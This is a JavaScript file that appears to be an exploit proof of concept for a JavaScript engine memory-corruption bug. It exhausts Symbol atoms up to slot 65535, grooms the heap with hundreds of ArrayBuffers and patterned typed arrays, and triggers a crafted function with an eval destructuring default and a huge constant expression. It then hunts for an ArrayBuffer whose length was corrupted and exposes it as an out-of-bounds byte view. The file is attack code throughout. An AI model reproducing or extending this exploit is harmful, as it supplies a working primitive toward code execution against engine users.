"use strict";
function f([] = eval("[]")) { var q1 = 0, q2 = 0, q3 = 0; return 1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5; }
var SY = new Array(65600);
for (var i = 0; i < 65600; i++) SY[i] = Symbol();
/* keep only a window of the last symbols: the atom array stays
   large and slot 65535 stays live; the other symbol strings are
   freed to reclaim heap. */
var KEEP = SY.slice(65600 - 3000); SY = null;
var RT = [4,0,0,0,5,0,0,0,4,0,0,0,4,0,0,0,4,0,0,0], RJ = [4,0,0,0,5,0,0,0,255,255,0,0,4,0,0,0,4,0,0,0];
var PB = new Uint8Array(3576);
var A = new Array(800), UV = new Array(800);
for (var i = 0; i < 800; i++) { A[i] = new ArrayBuffer(3576); }
for (var i = 0; i < 800; i++) { UV[i] = new Uint8Array(A[i]); }
var D = new Array(3000);
for (var i = 0; i < 3000; i++) D[i] = new ArrayBuffer(64);
var T = new Array(600);
for (var i = 0; i < 600; i++) T[i] = new ArrayBuffer(64);
T[600-2] = null;
var mark = "SAFE3584C";
function fill(p, q) {
  for (var i2 = 0; i2 < 3576; i2 += 4) PB[i2] = 4;
  for (var i = 0; i < 800; i++) UV[i].set(PB);
}
var hit = 0;
for (var ph = 0; ph < 20 && !hit; ph += 4) {
  for (var q = 0; q < 2 && !hit; q++) {
    fill(ph, q);
    try { f(); } catch (e) {}
    for (var i = 0; i < 600; i++) {
      if (T[i] !== null && T[i].byteLength > 1024) { hit = 1; mark = "TCHG[" + i + "]=" + T[i].byteLength; }
    }
  }
}
var V = null, VAB = null;
for (var i = 0; i < 600; i++) { if (T[i] !== null && T[i].byteLength > 1024) { VAB = T[i]; break; } }
if (VAB) { try { V = new Uint8Array(VAB); mark += " VLEN=" + V.length; } catch (e2) { mark += " VERR=" + e2; } }
globalThis.V = V; globalThis.VAB = VAB; globalThis.T = T;
throw new Error("RESULT " + mark);
/*PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP*/